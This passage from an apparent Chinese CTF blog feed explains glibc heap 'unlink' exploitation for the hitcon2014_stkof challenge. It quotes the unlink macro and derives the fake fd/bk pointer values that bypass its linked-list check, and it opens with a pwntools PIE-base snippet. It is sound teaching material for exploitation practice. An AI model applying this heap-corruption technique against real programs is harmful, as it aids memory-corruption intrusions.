punctuation\">[</span><span class=\"token string\">\"main\"</span><span class=\"token punctuation\">]</span> <span class=\"token comment\">#获得基地址</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>write_plt<span class=\"token operator\">=</span>base <span class=\"token operator\">+</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span> <span class=\"token comment\">#计算真实地址</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>write_got<span class=\"token operator\">=</span>base <span class=\"token operator\">+</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"write\"</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>参考：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLjUxY3RvLmNvbS9kdWFsbGF5LzE4NzY4NDE=\">https://blog.51cto.com/duallay/1876841</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubXJza3llLmNuL2FyY2hpdmVzLzkwNThkZmZjLyMlRTUlQkMlODAlRTUlOTAlQUYtUElF\">https://www.mrskye.cn/archives/9058dffc/# 开启 - PIE</span></p>\n",
            "tags": [
                "pwn",
                "Linux"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/10/02/pwn/%E4%B8%93%E6%A0%8F/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bunlink/",
            "url": "https://vvwwvv.cn/2023/10/02/pwn/%E4%B8%93%E6%A0%8F/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bunlink/",
            "title": "堆利用之unlink（例题：hitcon2014_stkof）",
            "date_published": "2023-10-02T06:15:56.000Z",
            "content_html": "<p>libc 源码下载：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2Z0cC5nbnUub3JnL2dudS9nbGliYy8=\">http://ftp.gnu.org/gnu/glibc/</span></p>\n<h1 id=\"1unlink\"><a class=\"anchor\" href=\"#1unlink\">#</a> 1.Unlink</h1>\n<p>这里参考了博客：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ob2xsay5ibG9nLmNzZG4ubmV0L2FydGljbGUvZGV0YWlscy8xMDg0ODE4ODk/c3BtPTEwMDEuMjAxNC4zMDAxLjU1MDI=\">https://hollk.blog.csdn.net/article/details/108481889?spm=1001.2014.3001.5502</span></p>\n<p><code>unlink</code>  是一个宏，定义在 malloc.c 里</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">unlink</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>AV<span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> BK<span class=\"token punctuation\">,</span> FD<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>                                            </span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    FD <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    BK <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">!=</span> P <span class=\"token operator\">||</span> BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\t\t      </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span>check_action<span class=\"token punctuation\">,</span> <span class=\"token string\">\"corrupted double-linked list\"</span><span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> AV<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> BK<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_smallbin_range</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>size<span class=\"token punctuation\">)</span>\t\t\t\t      </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\t\t      </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\t      </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token operator\">||</span> <span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>    </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t      <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span>check_action<span class=\"token punctuation\">,</span>\t\t\t\t      </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t       <span class=\"token string\">\"corrupted double-linked list (not small)\"</span><span class=\"token punctuation\">,</span>    </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t       P<span class=\"token punctuation\">,</span> AV<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t      </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">==</span> P<span class=\"token punctuation\">)</span>\t\t\t\t      </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                  FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> FD<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t      </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                    FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token punctuation\">;</span>\t\t\t      </pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                    FD<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span>\t\t\t      </pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                    P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t\t      </pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                    P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t\t\t      </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                  <span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>              <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span>\t\t      </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token punctuation\">;</span>\t\t      </pre></td></tr><tr><td data-num=\"28\"></td><td><pre>              <span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"29\"></td><td><pre>          <span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span>\t\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>unlink</code>  是在进行 <code>free</code>  操作时执行的，看上面的源码知道是对 <code>链表</code> 的操作，这里是修改指针的效果（unlink <code>目的</code> 就是将一个空闲块 (在链表中) 拿出来，例如 free 时和目前物理相邻的 free chunk 进行合并），我的理解是 <code>unlink</code>  是将空闲的块在有新释放的块满足条件要合并时进行的操作，因为想要合并，就需要先将空闲的块从链表里取下来， <code>unlink</code>  就是在进行这个取下来的操作</p>\n<p>执行 <code>unlink</code>  的函数（在 <code>free函数</code> 执行了 <code>int_free()函数</code> ，其中调用了 <code>unlink</code>  宏）</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">unlink</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>AV<span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> BK<span class=\"token punctuation\">,</span> FD<span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">_int_free</span> <span class=\"token punctuation\">(</span>mstate av<span class=\"token punctuation\">,</span> mchunkptr p<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> have_lock<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">_int_free</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>ctfwiki 上的图片：<br />\n<img data-src=\"https://z1.ax1x.com/2023/10/02/pPLyMQA.png\" alt=\"\" /><br />\n这里就能发现是将中间的 <code>P</code>  给取了出来，修改了 <code>BK</code>  和 <code>FD</code>  的指针</p>\n<p>图里面的执行顺序为：</p>\n<ol>\n<li>P-&gt;fd=FD</li>\n<li>P-&gt;bk=BK</li>\n<li>FD-&gt;bk=BK</li>\n<li>BK-&gt;fd=FD</li>\n</ol>\n<p>上面的释放顺序为：</p>\n<ol>\n<li>\n<p>free(FD)</p>\n</li>\n<li>\n<p>free(P)</p>\n</li>\n<li>\n<p>free(BK)</p>\n<p>所以在 bin 中为： <code>BK-&gt;P&gt;FD </code>   的顺序</p>\n</li>\n</ol>\n<h1 id=\"2unlink检查机制\"><a class=\"anchor\" href=\"#2unlink检查机制\">#</a> 2.unlink 检查机制</h1>\n<p>由于 unlink 是在 free 函数中调用的，所以只需要检查 chunk 是否为空闲</p>\n<p>其检查机制有三个：</p>\n<ol>\n<li>检查被释放的 <code>chunk</code>  的 <code>size</code>  的值是否与相邻高地址的 <code>chunk</code>  的 <code>pre_size</code>  的大小相同（这里忽略 <code>p</code>  标志位， <code>p标志位</code> 为 size 最低位）【一个块为空闲时，相邻高地址块的 <code>pre_size</code>  为前一个块的大小（=size）】</li>\n<li>检查被释放 chunk 与相邻高地址的 <code>chunk</code>  的 <code>size</code>  的 <code>P标志位</code> 是否为 0， <code>p为0则表示前一个chunk空闲</code></li>\n<li>检查前后被释放 chunk 的 fd 和 bk</li>\n</ol>\n<h1 id=\"3unlink绕过\"><a class=\"anchor\" href=\"#3unlink绕过\">#</a> 3.unlink 绕过</h1>\n<p>我们想要利用 unlink，就需要绕过其检查，而上面的三个检查机制里前面两个通过溢出直接修改即可，后面的则需要我们进行一番操作</p>\n<h2 id=\"1关键检查\"><a class=\"anchor\" href=\"#1关键检查\">#</a> 1. 关键检查：</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">!=</span> P <span class=\"token operator\">||</span> BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>            </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"corrupted double-linked list\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>上面的是检查在 <code>空闲的链表</code> 中前后释放的 <code>chunk的指针</code> 是否对应正确</p>\n<h2 id=\"2绕过\"><a class=\"anchor\" href=\"#2绕过\">#</a> 2. 绕过</h2>\n<p>下面的图里我们可以看到空闲链表的结构：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/03/pPOVsYj.png\" alt=\"\" /></p>\n<p>这里我们可以知道各个指针指向的位置：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>P<span class=\"token operator\">-></span>fd<span class=\"token operator\">=</span>FD</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>P<span class=\"token operator\">-></span>bk<span class=\"token operator\">=</span>BK</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>FD<span class=\"token operator\">-></span>bk<span class=\"token operator\">=</span>P   <span class=\"token comment\">// 关键检查</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>BK<span class=\"token operator\">-></span>fd<span class=\"token operator\">=</span>P    <span class=\"token comment\">// 关键检查</span></pre></td></tr></table></figure><p>1. 这里我们知道 <code>FD</code>  从 <code>pre_size</code>  位到 <code>bk</code>  位需要 <code>0x18</code>  个大小（32 位是 12 个），也就是说 <code>&amp;FD+0x18=&amp;bk</code> , 而 <code>P-&gt;fd=FD</code>  并且 <code>FD的bk</code>  的值为 P 的地址，所以 <code>P-&gt;fd-&gt;bk=P&lt;=&gt;*(P-&gt;fd+0x18)=P</code></p>\n<p>这里 <code>*(P-&gt;fd+0x18)=P</code> <mark>&gt;P-&gt;fd+0x18=&amp;P</mark>&gt; <code>P-&gt;fd=&amp;P-0X18</code></p>\n<p>2. 同理知道 BK 的 <code>pre_size</code>  位到 <code>fd</code>  位需要 <code>0x10</code>  个大小（32 位是 8 个），即 <code>&amp;BK+0X10=&amp;fd</code> ，而 P-&gt;bk=BK 并且 BK 的 fd 的值为 P，所以 <code>P-&gt;bk-&gt;fd=P&lt;=&gt; *(P-&gt;bk+0x10)=P</code></p>\n<p>这里 <code>*(P-&gt;bk+0x10)=P</code> <mark>&gt;P-&gt;bk+0x10=&amp;P</mark>&gt; <code>P-&gt;bk=&amp;P-0X10</code></p>\n<p>也就是说我们最终通过：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>P<span class=\"token operator\">-></span>fd<span class=\"token operator\">-></span>bk <span class=\"token operator\">==</span> P <span class=\"token operator\">&lt;=</span><span class=\"token operator\">></span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd <span class=\"token operator\">+</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> P </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p<span class=\"token operator\">-></span>bk<span class=\"token operator\">-></span>fd <span class=\"token operator\">==</span> P <span class=\"token operator\">&lt;=</span><span class=\"token operator\">></span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-></span>bk <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> P</pre></td></tr></table></figure><p>得到了：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>P<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>P <span class=\"token operator\">-</span> <span class=\"token number\">0x18</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>P<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>P <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span></pre></td></tr></table></figure><p><strong>这意味着当我们的 P 中的 <code>fd=&amp;P - 0x18 </code>  , <code>bk=&amp;P - 0x10</code>  就能绕过检查 (这里是将 fd 的 <code>内容</code>  设置为 (&amp;p-0x18)，将 bk 的 <code>内容</code> 设置为 (&amp;p-0x10) )</strong></p>\n<h2 id=\"3不同链表的unlinkfd_nextchunk和bk_prechunk分别为了方便在large-bins中快速地管理chunk块\"><a class=\"anchor\" href=\"#3不同链表的unlinkfd_nextchunk和bk_prechunk分别为了方便在large-bins中快速地管理chunk块\">#</a> 3. 不同链表的 unlink（fd_nextchunk 和 bk_prechunk 分别为了方便在 large bins 中快速地管理 chunk 块）</h2>\n<p>因为 P 的脱链操作只能在 <code>smallbin</code>  和 <code>largebin</code>  中（无法在 fastbin 中）进行，而这两个 bin 都是 <code>双向链表</code> ，所以我们必须修改 <code>前后</code>  chunk 的 fd 和 bk 指针</p>\n<p>上面已经得出了结论，这里有别人更详细的推导：<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNTU3ODcy\">https://cloud.tencent.com/developer/article/1557872</span></p>\n<h3 id=\"对于smallbin来说\"><a class=\"anchor\" href=\"#对于smallbin来说\">#</a> 对于 smallbin 来说：</h3>\n<p><code>smallbin</code>  通过上面的方式直接就可以完成脱链，因为 smallbin 中的 chunk 的  <code>fd_nextsize</code>  和  <code>bk_nextsize</code>  是没有意义的</p>\n<h3 id=\"对于largebin来说\"><a class=\"anchor\" href=\"#对于largebin来说\">#</a> 对于 largebin 来说：</h3>\n<p>对于 smallbin 来说，脱链操作上面就已经完成了，但是对于 largebin 来说，还有未完成的工作，因为 largebin 中还有 fdnextsize 以及 bknextsize 指针需要修改。</p>\n<p>在 largebin 中，也只有在相同尺寸的同一组 chunks 中的第一个 chunk 中  <code>fd_nextsize</code>  以及  <code>bk_nextsize</code>  才有意义。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_smallbin_range</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>size<span class=\"token punctuation\">)</span>                \\</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>当 <code>P-&gt;fdnextsize!=null</code>  时才需要修改（这里意味着 P 是 <code>这一组</code> 相同尺寸 chunk 的第一块 chunk），如果  <code>P-&gt;fdnextsize == null</code>  ，说明 P 是尺寸相同的一组 chunks 的非第一个 chunk，此时 P 的  <code>fdnextsize</code>  和 <code>bknextsize</code>  是没有意义的，自然没有修改的必要</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>                    </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>P<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">==</span> P<span class=\"token punctuation\">)</span>                      </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                  FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> FD<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>             </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>                                </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                    FD<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token punctuation\">;</span>                 </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                    FD<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span>                 </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                    P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>                 </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                    P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>                 </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                  <span class=\"token punctuation\">&#125;</span>                               </pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>                                </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span>             </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                P<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd_nextsize<span class=\"token punctuation\">;</span>             </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>           <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>如果 FD-&gt;fd_nextsize == NULL ，那么 P 脱链（P 为 <code>这一组</code> 第一个 chunk）后 FD 即成为当前尺寸相同的 chunks 的第一个 chunk。</p>\n<p>接着判断 P-&gt;fd_nextsize == P ，因为当 P 为仅有的唯一一组尺寸相同的 chunks 的第一个 chunk 的话，是需要特别对待的，P 不为第一个时 FD 直接继承 P 的 fdnextsize 以及 bknextsize 即可。</p>\n<p>如果 FD-&gt;fd_nextsize != NULL ，说明 FD 是下一组尺寸相同的 chunks 的第一个 chunk。（这里是每一个组的第一个都是满足这个条件）</p>\n<h1 id=\"4unlink利用\"><a class=\"anchor\" href=\"#4unlink利用\">#</a> 4.Unlink 利用</h1>\n<p>由上面的绕过可以得知:</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>P<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>P <span class=\"token operator\">-</span> <span class=\"token number\">0x18</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>P<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>P <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span></pre></td></tr></table></figure><p>而在 unlink 宏中：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name function\">unlink</span><span class=\"token expression\"><span class=\"token punctuation\">(</span>AV<span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> BK<span class=\"token punctuation\">,</span> FD<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>                                            </span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    FD <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    BK <span class=\"token operator\">=</span> P<span class=\"token operator\">-></span>bk<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">!=</span> P <span class=\"token operator\">||</span> BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\t\t      </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span>check_action<span class=\"token punctuation\">,</span> <span class=\"token string\">\"corrupted double-linked list\"</span><span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> AV<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\t\t\t\t\t\t\t\t      </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> BK<span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">// 在这里 BK=P->bk\t\t\t\t\t      </span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> FD<span class=\"token punctuation\">;</span>\t        <span class=\"token comment\">// 在这里 FD=P->fd</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>     <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token 